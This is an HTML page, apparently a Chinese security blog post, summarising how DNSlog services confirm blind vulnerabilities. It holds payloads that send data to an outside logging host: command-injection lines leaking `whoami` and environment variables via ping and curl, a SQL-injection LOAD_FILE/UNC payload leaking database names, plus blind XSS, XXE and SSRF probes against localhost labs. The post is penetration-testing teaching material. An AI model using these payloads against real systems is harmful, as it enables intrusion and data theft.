@@ -1,0 +1,536 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>DNSlog利用姿势总结 | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="前言 在肾透的过程中，dnslog是不可或缺的好工具。在之前的log4j2的过年事件中，dnslog更是火了一波，直接被干崩了，xs。。。下边">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/86/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/86/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="DNSlog利用姿势总结" />
+<meta property="og:description" content="前言 在肾透的过程中，dnslog是不可或缺的好工具。在之前的log4j2的过年事件中，dnslog更是火了一波，直接被干崩了，xs。。。下边" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/86/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-01-07T13:04:09+00:00" />
+<meta property="article:modified_time" content="2022-01-07T13:04:09+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="DNSlog利用姿势总结"/>
+<meta name="twitter:description" content="前言 在肾透的过程中，dnslog是不可或缺的好工具。在之前的log4j2的过年事件中，dnslog更是火了一波，直接被干崩了，xs。。。下边"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "DNSlog利用姿势总结",
+      "item": "https://a10nggg.github.io/archives/86/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "DNSlog利用姿势总结",
+  "name": "DNSlog利用姿势总结",
+  "description": "前言 在肾透的过程中，dnslog是不可或缺的好工具。在之前的log4j2的过年事件中，dnslog更是火了一波，直接被干崩了，xs。。。下边",
+  "keywords": [
+    
+  ],
+  "articleBody": "前言 在肾透的过程中，dnslog是不可或缺的好工具。在之前的log4j2的过年事件中，dnslog更是火了一波，直接被干崩了，xs。。。下边我梳理一下在肾透中DNSlog的一些利用姿势。\nDNSlog简介 DNS 的全称是 Domain Name System（网络名称系统），它作为将域名和IP地址相互映射，使人更方便地访问互联网。当用户输入某一网址如 www.baidu.com， 网络上的 DNS Server 会将该域名解析，并找到对应的真实 IP 如 127.0.0.1，使用户可以访问这台服务器上相应的服务\n。DNSlog 就是存储在 DNS Server 上的域名信息，它记录着用户对域名 www.baidu.com 等的访问信息，类似日志文件。\n一些DNs http://ceye.io。\nhttp://www.dnslog.cn/\nhttps://dig.pm/\n当然也可以自己搭建，github上有开源项目，https://github.com/BugScanTeam/DNSLog。\n命令盲注回显 判断linux还是windows\n1.先测试ping.exe test.ob3.ceye.io 是否接收到dnslog解析,如果可以则说明是windows 2.再测试ping -c 1 test.ob3.ceye.io，如果可以执行说明是linux。 linux 用反引号可以带出执行的结果，如果因为有其他编码导致不好使的时候，可以base64编码，\nping `whoami`.iqcsit.ceye.io curl http://iqcsit.ceye.io/`whoami` 执行之后，我们去DNSlog平台查看结果。\n{.wp-editor-md-post-content-link}\nWindows 用%包上常用变量。就能用ping带出结果。\nping %USERNAME%.iqcsit.ceye.io curl http://iqcsit.ceye.io/%APPDATA% windowns很多变量用ping不好使。用curl就好使了\n{.wp-editor-md-post-content-link}\n变量 类型 描述 %ALLUSERSPROFILE% 本地 返回“所有⽤户”配置⽂件的位置。 %APPDATA% 本地 返回默认情况下应⽤程序存储数据的位置。 %CD% 本地 返回当前⽬录字符串。 %CMDCMDLINE% 本地 返回⽤来启动当前的Cmd.exe %CMDEXTVERSION% 系统 返回当前的“命令处理程序扩展”的版本号。 %COMPUTERNAME% 系统 返回计算机的名称。 %COMSPEC% 系统 返回命令⾏解释器可执⾏程序的准确路径。 %DATE% 系统 返回当前⽇期。使⽤与date /t 命令相同的格式。由 Cmd.exe ⽣成。有关 date 命令的详细信息，请参阅Date。 %ERRORLEVEL% 系统 返回上⼀条命令的错误代码。通常⽤⾮零值表示错误。 %HOMEDRIVE% 系统 返回连接到⽤户主⽬录的本地⼯作站驱动器号。基于主⽬录值⽽设置。⽤户主⽬录是在“本地⽤户和组”中指定的。 %HOMEPATH% 系统 返回⽤户主⽬录的完整路径。基于主⽬录值⽽设置。⽤户主⽬录是在“本地⽤户和组”中指定的。 %HOMESHARE% 系统 返回⽤户的共享主⽬录的⽹络路径。基于主⽬录值⽽设置。⽤户主⽬录是在“本地⽤户和组”中指定的。 %LOGONSERVER% 本地 返回验证当前登录会话的域控制器的名称。 %NUMBER_OF_PROCESSORS% 系统 指定安装在计算机上的处理器的数⽬。 %OS% 系统 返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。 %PATH% 系统 指定可执⾏⽂件的搜索路径。 %PATHEXT% 系统 返回操作系统认为可执⾏的⽂件扩展名的列表。 %PROCESSOR_ARCHITECTURE% 系统 返回处理器的芯⽚体系结构。值：x86 或 IA64（基于 Itanium）。 %PROCESSOR_IDENTFIER% 系统 返回处理器说明。 %PROCESSOR_LEVEL% 系统 返回计算机上安装的处理器的型号。 %PROCESSOR_REVISION% 系统 返回处理器的版本号。 %PROMPT% 本地 返回当前解释程序的命令提示符设置。由Cmd.exe ⽣成。 %RANDOM% 系统 返回 0 到 32767 之间的任意⼗进制数字。由 Cmd.exe ⽣成。如果⽬标系统是linux的话，则可⽤shell语⾔或者 %SYSTEMDRIVE% 系统 返回包含 Windowsserver operating system 根⽬录（即系统根⽬录）的驱动器。 %SYSTEMROOT% 系统 返回 Windowsserver operating system 根⽬录的位置。 %TEMP%和%TMP% 系统和⽤户 返回对当前登录⽤户可⽤的应⽤程序所使⽤的默认临时⽬录。有些应⽤程序需要 TEMP，⽽其他应⽤程序则需要 TMP。 %TIME% 系统 返回当前时间。使⽤与time /t命令相同的格式。由Cmd.exe⽣成。有关time命令的详细信息，请参阅 Time。 %USERDOMAIN% 本地 返回包含⽤户帐户的域的名称。 %USERNAME% 本地 返回当前登录的⽤户的名称。 %USERPROFILE% 本地 返回当前⽤户的配置⽂件的位置。 %WINDIR% 系统 返回操作系统⽬录的位置。 SQL盲注回显 当页面无法正常回显的时候可以考虑这种注入方式，把数据从数据库带出来。\n通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。\nshow variables like ‘%secure%’;查看load_file()可以读取的磁盘。\n当secure_file_priv为空，就可以读取磁盘的目录。 当secure_file_priv为C:\\，就可以读取C盘的文件。 当secure_file_priv为null，load_file就不能加载文件。 UNC路径 讲到这就不得不讲UNC路径。UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。\n在内网渗透里的$IPC连接所用的就是这个玩意儿。\n这儿 因为微软阴阳怪气的喜欢用反斜杠，所以在这本来是两个，因为需要转义，所以有需要加两个就是四个。\npayload:\nSELECT LOAD_FILE(CONCAT('\\\\\\\\',(sql查询语句),'.iqcsit.ceye.io\\\\abc'));\nhttp://127.0.0.1/sqli-labs-master/Less-1/?id='and (SELECT LOAD_FILE(CONCAT(\"\\\\\\\\\",(SELECT database()),\".iqcsit.ceye.io\\\\abc\")))--+\n{.wp-editor-md-post-content-link}\nXSS盲打 对于没有回显的XSS，我们要想知道是否成功也可以利用img标签src属性填入得到的域名，然后打入xss，当被攻击着浏览时就会自动加载该资源，如果DNSlog有回显，说明存在漏洞。\n一般盲打的时候，见框就插。\npayload:\nhttp://127.0.0.1/xss-tz/.php?name=%3E%3Cimg%20src=http://xss.iqcsit.ceye.io/abc%3E\n{.wp-editor-md-post-content-link}\nXXE 遇到疑似XXE漏洞，如果它可以解析外部实体，那就可以用来读取服务器上的文件，同样远程文件也可以。那我们就可以用来测试。\n\u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY % xxe SYSTEM \"http://iqcsit.ceye.io/aaa\"\u003e %xxe;%int;%send; ]\u003e \u0026test;A10ng_ {.wp-editor-md-post-content-link}\nSSRF 在遇到SSRF漏洞无回显时，可以利用DNSlog进行验证。\npayload:\nPOST /ssrf/file_get_content.php HTTP/1.1 Host: 127.0.0.1 file=http://iqcsit.ceye.io/aaa\u0026read=load+file {.wp-editor-md-post-content-link}\n",
+  "wordCount" : "2181",
+  "inLanguage": "en",
+  "datePublished": "2022-01-07T13:04:09Z",
+  "dateModified": "2022-01-07T13:04:09Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/86/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      DNSlog利用姿势总结
+    </h1>
+    <div class="post-meta"><span title='2022-01-07 13:04:09 +0000 +0000'>January 7, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h1 id="前言">前言<a hidden class="anchor" aria-hidden="true" href="#前言">#</a></h1>
+<p>在肾透的过程中，dnslog是不可或缺的好工具。在之前的log4j2的过年事件中，dnslog更是火了一波，直接被干崩了，xs。。。下边我梳理一下在肾透中DNSlog的一些利用姿势。</p>
+<h1 id="dnslog简介">DNSlog简介<a hidden class="anchor" aria-hidden="true" href="#dnslog简介">#</a></h1>
+<p>DNS 的全称是 Domain Name System（网络名称系统），它作为将域名和IP地址相互映射，使人更方便地访问互联网。当用户输入某一网址如 <a href="https://www.baidu.com">www.baidu.com</a>， 网络上的 DNS Server 会将该域名解析，并找到对应的真实 IP 如 127.0.0.1，使用户可以访问这台服务器上相应的服务<br>
+。DNSlog 就是存储在 DNS Server 上的域名信息，它记录着用户对域名 <a href="https://www.baidu.com">www.baidu.com</a> 等的访问信息，类似日志文件。</p>
+<h1 id="一些dns">一些DNs<a hidden class="anchor" aria-hidden="true" href="#一些dns">#</a></h1>
+<p><a href="http://ceye.io">http://ceye.io</a>。<br>
+<a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a><br>
+<a href="https://dig.pm/">https://dig.pm/</a><br>
+当然也可以自己搭建，github上有开源项目，https://github.com/BugScanTeam/DNSLog。</p>
+<h1 id="命令盲注回显">命令盲注回显<a hidden class="anchor" aria-hidden="true" href="#命令盲注回显">#</a></h1>
+<p>判断linux还是windows</p>
+<ul>
+<li>1.先测试ping.exe test.ob3.ceye.io 是否接收到dnslog解析,如果可以则说明是windows</li>
+<li>2.再测试ping -c 1 test.ob3.ceye.io，如果可以执行说明是linux。</li>
+</ul>
+<h3 id="linux">linux<a hidden class="anchor" aria-hidden="true" href="#linux">#</a></h3>
+<p>用反引号可以带出执行的结果，如果因为有其他编码导致不好使的时候，可以base64编码，</p>
+<pre><code class="line-numbers">ping `whoami`.iqcsit.ceye.io
+curl http://iqcsit.ceye.io/`whoami`
+</code></pre>
+<p>执行之后，我们去DNSlog平台查看结果。<br>
+<a href="/uploads/2022/01/wp_editor_md_850554020d4fe60f08fae5a47a913e0a.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_850554020d4fe60f08fae5a47a913e0a.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h3 id="windows">Windows<a hidden class="anchor" aria-hidden="true" href="#windows">#</a></h3>
+<p>用%包上常用变量。就能用ping带出结果。</p>
+<pre><code class="line-numbers">ping %USERNAME%.iqcsit.ceye.io
+curl http://iqcsit.ceye.io/%APPDATA%
+</code></pre>
+<p>windowns很多变量用ping不好使。用curl就好使了<br>
+<a href="/uploads/2022/01/wp_editor_md_d25cb5a9a959399a008e83041c1aa977.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_d25cb5a9a959399a008e83041c1aa977.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">变量</th>
+<th style="text-align:center">类型</th>
+<th style="text-align:left">描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">%ALLUSERSPROFILE%</td>
+<td style="text-align:center">本地</td>
+<td style="text-align:left">返回“所有⽤户”配置⽂件的位置。</td>
+</tr>
+<tr>
+<td style="text-align:left">%APPDATA%</td>
+<td style="text-align:center">本地</td>
+<td style="text-align:left">返回默认情况下应⽤程序存储数据的位置。</td>
+</tr>
+<tr>
+<td style="text-align:left">%CD%</td>
+<td style="text-align:center">本地</td>
+<td style="text-align:left">返回当前⽬录字符串。</td>
+</tr>
+<tr>
+<td style="text-align:left">%CMDCMDLINE%</td>
+<td style="text-align:center">本地</td>
+<td style="text-align:left">返回⽤来启动当前的Cmd.exe</td>
+</tr>
+<tr>
+<td style="text-align:left">%CMDEXTVERSION%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回当前的“命令处理程序扩展”的版本号。</td>
+</tr>
+<tr>
+<td style="text-align:left">%COMPUTERNAME%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回计算机的名称。</td>
+</tr>
+<tr>
+<td style="text-align:left">%COMSPEC%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回命令⾏解释器可执⾏程序的准确路径。</td>
+</tr>
+<tr>
+<td style="text-align:left">%DATE%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回当前⽇期。使⽤与date /t 命令相同的格式。由 Cmd.exe ⽣成。有关 date 命令的详细信息，请参阅Date。</td>
+</tr>
+<tr>
+<td style="text-align:left">%ERRORLEVEL%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回上⼀条命令的错误代码。通常⽤⾮零值表示错误。</td>
+</tr>
+<tr>
+<td style="text-align:left">%HOMEDRIVE%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回连接到⽤户主⽬录的本地⼯作站驱动器号。基于主⽬录值⽽设置。⽤户主⽬录是在“本地⽤户和组”中指定的。</td>
+</tr>
+<tr>
+<td style="text-align:left">%HOMEPATH%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回⽤户主⽬录的完整路径。基于主⽬录值⽽设置。⽤户主⽬录是在“本地⽤户和组”中指定的。</td>
+</tr>
+<tr>
+<td style="text-align:left">%HOMESHARE%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回⽤户的共享主⽬录的⽹络路径。基于主⽬录值⽽设置。⽤户主⽬录是在“本地⽤户和组”中指定的。</td>
+</tr>
+<tr>
+<td style="text-align:left">%LOGONSERVER%</td>
+<td style="text-align:center">本地</td>
+<td style="text-align:left">返回验证当前登录会话的域控制器的名称。</td>
+</tr>
+<tr>
+<td style="text-align:left">%NUMBER_OF_PROCESSORS%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">指定安装在计算机上的处理器的数⽬。</td>
+</tr>
+<tr>
+<td style="text-align:left">%OS%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回操作系统名称。Windows 2000 显示其操作系统为 Windows_NT。</td>
+</tr>
+<tr>
+<td style="text-align:left">%PATH%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">指定可执⾏⽂件的搜索路径。</td>
+</tr>
+<tr>
+<td style="text-align:left">%PATHEXT%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回操作系统认为可执⾏的⽂件扩展名的列表。</td>
+</tr>
+<tr>
+<td style="text-align:left">%PROCESSOR_ARCHITECTURE%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回处理器的芯⽚体系结构。值：x86 或 IA64（基于 Itanium）。</td>
+</tr>
+<tr>
+<td style="text-align:left">%PROCESSOR_IDENTFIER%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回处理器说明。</td>
+</tr>
+<tr>
+<td style="text-align:left">%PROCESSOR_LEVEL%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回计算机上安装的处理器的型号。</td>
+</tr>
+<tr>
+<td style="text-align:left">%PROCESSOR_REVISION%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回处理器的版本号。</td>
+</tr>
+<tr>
+<td style="text-align:left">%PROMPT%</td>
+<td style="text-align:center">本地</td>
+<td style="text-align:left">返回当前解释程序的命令提示符设置。由Cmd.exe ⽣成。</td>
+</tr>
+<tr>
+<td style="text-align:left">%RANDOM%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回 0 到 32767 之间的任意⼗进制数字。由 Cmd.exe ⽣成。如果⽬标系统是linux的话，则可⽤shell语⾔或者</td>
+</tr>
+<tr>
+<td style="text-align:left">%SYSTEMDRIVE%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回包含 Windowsserver operating system 根⽬录（即系统根⽬录）的驱动器。</td>
+</tr>
+<tr>
+<td style="text-align:left">%SYSTEMROOT%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回 Windowsserver operating system 根⽬录的位置。</td>
+</tr>
+<tr>
+<td style="text-align:left">%TEMP%和%TMP%</td>
+<td style="text-align:center">系统和⽤户</td>
+<td style="text-align:left">返回对当前登录⽤户可⽤的应⽤程序所使⽤的默认临时⽬录。有些应⽤程序需要 TEMP，⽽其他应⽤程序则需要 TMP。</td>
+</tr>
+<tr>
+<td style="text-align:left">%TIME%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回当前时间。使⽤与time /t命令相同的格式。由Cmd.exe⽣成。有关time命令的详细信息，请参阅 Time。</td>
+</tr>
+<tr>
+<td style="text-align:left">%USERDOMAIN%</td>
+<td style="text-align:center">本地</td>
+<td style="text-align:left">返回包含⽤户帐户的域的名称。</td>
+</tr>
+<tr>
+<td style="text-align:left">%USERNAME%</td>
+<td style="text-align:center">本地</td>
+<td style="text-align:left">返回当前登录的⽤户的名称。</td>
+</tr>
+<tr>
+<td style="text-align:left">%USERPROFILE%</td>
+<td style="text-align:center">本地</td>
+<td style="text-align:left">返回当前⽤户的配置⽂件的位置。</td>
+</tr>
+<tr>
+<td style="text-align:left">%WINDIR%</td>
+<td style="text-align:center">系统</td>
+<td style="text-align:left">返回操作系统⽬录的位置。</td>
+</tr>
+</tbody>
+</table>
+<h1 id="sql盲注回显">SQL盲注回显<a hidden class="anchor" aria-hidden="true" href="#sql盲注回显">#</a></h1>
+<p>当页面无法正常回显的时候可以考虑这种注入方式，把数据从数据库带出来。<br>
+通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。<br>
+show variables like &lsquo;%secure%&rsquo;;查看load_file()可以读取的磁盘。</p>
+<ul>
+<li>当secure_file_priv为空，就可以读取磁盘的目录。</li>
+<li>当secure_file_priv为C:\，就可以读取C盘的文件。</li>
+<li>当secure_file_priv为null，load_file就不能加载文件。</li>
+</ul>
+<h3 id="unc路径">UNC路径<a hidden class="anchor" aria-hidden="true" href="#unc路径">#</a></h3>
+<p>讲到这就不得不讲UNC路径。UNC是一种命名惯例, 主要用于在Microsoft Windows上指定和映射网络驱动器. UNC命名惯例最多被应用于在局域网中访问文件服务器或者打印机。我们日常常用的网络共享文件就是这个方式。<br>
+在内网渗透里的$IPC连接所用的就是这个玩意儿。<br>
+这儿 因为微软阴阳怪气的喜欢用反斜杠，所以在这本来是两个，因为需要转义，所以有需要加两个就是四个。<br>
+payload:<br>
+<code>SELECT LOAD_FILE(CONCAT('\\\\',(sql查询语句),'.iqcsit.ceye.io\\abc'));</code></p>
+<p><code>http://127.0.0.1/sqli-labs-master/Less-1/?id='and (SELECT LOAD_FILE(CONCAT(&quot;\\\\&quot;,(SELECT database()),&quot;.iqcsit.ceye.io\\abc&quot;)))--+</code><br>
+<a href="/uploads/2022/01/wp_editor_md_507976bee567c76a87d40d519f785e19.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_507976bee567c76a87d40d519f785e19.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h1 id="xss盲打">XSS盲打<a hidden class="anchor" aria-hidden="true" href="#xss盲打">#</a></h1>
+<p>对于没有回显的XSS，我们要想知道是否成功也可以利用img标签src属性填入得到的域名，然后打入xss，当被攻击着浏览时就会自动加载该资源，如果DNSlog有回显，说明存在漏洞。<br>
+一般盲打的时候，见框就插。<br>
+payload:<br>
+<code>http://127.0.0.1/xss-tz/.php?name=%3E%3Cimg%20src=http://xss.iqcsit.ceye.io/abc%3E</code><br>
+<a href="/uploads/2022/01/wp_editor_md_5a7f4405c7fbbcb02790df0440e415bc.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_5a7f4405c7fbbcb02790df0440e415bc.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h1 id="xxe">XXE<a hidden class="anchor" aria-hidden="true" href="#xxe">#</a></h1>
+<p>遇到疑似XXE漏洞，如果它可以解析外部实体，那就可以用来读取服务器上的文件，同样远程文件也可以。那我们就可以用来测试。</p>
+<pre><code class="line-numbers">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % xxe SYSTEM "http://iqcsit.ceye.io/aaa"&gt;
+%xxe;%int;%send; ]&gt;
+&lt;user&gt;&lt;username&gt;&test;&lt;/username&gt;&lt;password&gt;A10ng_&lt;/password&gt;&lt;/user&gt;
+
+</code></pre>
+<p><a href="/uploads/2022/01/wp_editor_md_a5b8e5b26c08217c34f2a597fe9b1d72.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_a5b8e5b26c08217c34f2a597fe9b1d72.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+<h1 id="ssrf">SSRF<a hidden class="anchor" aria-hidden="true" href="#ssrf">#</a></h1>
+<p>在遇到SSRF漏洞无回显时，可以利用DNSlog进行验证。<br>
+payload:</p>
+<pre><code class="line-numbers">POST /ssrf/file_get_content.php HTTP/1.1
+Host: 127.0.0.1
+
+file=http://iqcsit.ceye.io/aaa&read=load+file
+</code></pre>
+<p><a href="/uploads/2022/01/wp_editor_md_e234a30f8668b5ec8ca73e76c74345b3.jpg"><img loading="lazy" src="/uploads/2022/01/wp_editor_md_e234a30f8668b5ec8ca73e76c74345b3.jpg" alt=""  />
+</a>{.wp-editor-md-post-content-link}</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
